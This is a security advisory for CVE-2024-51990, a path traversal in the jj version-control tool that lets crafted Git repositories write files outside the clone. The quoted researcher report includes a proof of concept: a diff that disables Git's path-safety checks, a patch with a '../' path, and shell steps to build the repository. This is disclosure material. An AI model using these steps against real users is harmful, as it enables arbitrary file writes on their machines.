# [C] jj vulnerable to path traversal via crafted Git repositories

## Summary
Severity: Critical
Advisory: GHSA-88h5-6w7m-5w56
CVE: CVE-2024-51990
CWE: CWE-22
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2024-11-07
Source: https://github.com/advisories/GHSA-88h5-6w7m-5w56
Type: github-advisory

## Affected
- crates.io: `jj-lib` — affected >=0 <0.23.0

## Details
### Impact

Specially crafted Git repositories can cause `jj` to write files outside the clone.

### Patches

Fixed in 0.23.0.

### Workarounds

Not much other than to not clone repositories from untrusted sources.

### References

Here's the original report from @joernchen:

> When cloning a crafted Git repository it is possible to let `jj` write
> into arbitrary directories. This can be achieved by having file objects
> which contain path traversals.
> 
> Reproduction steps:
> 
> Apply the following patch to Git version v.2.47.0:
> 
> ```diff
> diff --git a/path.c b/path.c
> index 93491bab14..2f47e69fd1 100644
> --- a/path.c
> +++ b/path.c
> @@ -44,11 +44,11 @@ struct strbuf *get_pathname(void)
> 
>  static const char *cleanup_path(const char *path)
>  {
> -       /* Clean it up */
> +       /* Clean it up
>         if (skip_prefix(path, "./", &path)) {
>                 while (*path == '/')
>                         path++;
> -       }
> +       }*/
>         return path;
>  }
> 
> @@ -1101,7 +1101,9 @@ int normalize_path_copy_len(char *dst, const char *src, int *prefix_len)
> 
>  int normalize_path_copy(char *dst, const char *src)
>  {
> -       return normalize_path_copy_len(dst, src, NULL);
> +//     return normalize_path_copy_len(dst, src, NULL);
> +       memcpy(dst, src, strlen(dst));
> +       return 0;
>  }
> 
>  int strbuf_normalize_path(struct strbuf *src)
> diff --git a/read-cache.c b/read-cache.c
> index 3c078afadb..2eb44cb26f 100644
> --- a/read-cache.c
> +++ b/read-cache.c
> @@ -977,6 +977,7 @@ static enum verify_path_result verify_path_internal(const char *path,
>                                                     unsigned mode)
>  {
>         char c = 0;
> +       return PATH_OK;
> 
>         if (has_dos_drive_prefix(path))
>                 return PATH_INVALID;
> ```
> 
> With this patched `git` binary we can now apply a crafted
> patch containing a path traversal to a repository.
> 
> The patch would look like:
> 
> ```patch
> From ecea96264bd3f9785e5ebec8640be4847ba28e22 Mon Sep 17 00:00:00 2001
> From: joernchen <[joernchen@phenoelit.de](mailto:joernchen@phenoelit.de)>
> Date: Sun, 13 Oct 2024 18:09:50 +0200
> Subject: [PATCH] z123
> 
> ---
>  z | 0
>  1 file changed, 0 insertions(+), 0 deletions(-)
>  create mode 100644 z
> 
> diff --git a/../joernchen_was_here b/../joernchen_was_here
> new file mode 100644
> index 0000000..e69de29
> --
> 2.46.1
> ```
> 
> Note the traversal `../joernchen_was_here` in the patch. This now can be committed to a repository
> using the modified `git` binary:
> 
> ```bash
> mkdir demo
> cd demo
> git init
> ./path/to/modified/git/git --exec-path=./path/to/modified/git am the_traversal.patch
> rm ../joernchen_was_here # remove the file the modified git wrote
> ```
> 
> Now, when cloning that repository with `jj git clone` the path traversal will write above the worktree
> directory, allowing arbitrary file writes.
> 
> I've attached a tar.gz with the demo repo so you don't have to mess with the patched Git at all. For
> reproduction it should be sufficient to do `jj git clone demo.git` after unpacking the tarball.
> 
> The demo repository after being cloned with `jj` will create an empty file `joernchen_was_here` right next
> to the `demo` directory to demonstrate the traversal.

## References
- https://github.com/martinvonz/jj/security/advisories/GHSA-88h5-6w7m-5w56
- https://nvd.nist.gov/vuln/detail/CVE-2024-51990
- https://github.com/martinvonz/jj
